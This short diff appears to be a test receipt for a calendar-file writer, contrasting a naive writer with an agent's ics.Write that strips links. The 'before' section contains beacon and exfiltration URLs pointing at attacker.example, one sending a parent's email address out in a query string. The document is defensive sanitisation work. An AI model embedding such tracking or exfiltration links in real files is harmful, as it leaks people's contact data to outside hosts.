@@ -1,0 +1,12 @@
+== before: a naive calendar writer ==
+  LOCATION:Library http://attacker.example/pixel.gif
+  DESCRIPTION:RSVP at http://attacker.example/exfil?who=parent.contact@example.com
+  the beacon host "attacker.example" is in the file: true (it fires when the event is rendered)
+
+== after: the agent's real ics.Write ==
+  LOCATION:Library [link removed]
+  DESCRIPTION:RSVP at [link removed]
+  DESCRIPTION:Book Fair
+  links/schemes removed: 2; the beacon host in the file: false
+
+attack blocked (the receipt): the beacon survives a naive writer, stripped by the real one
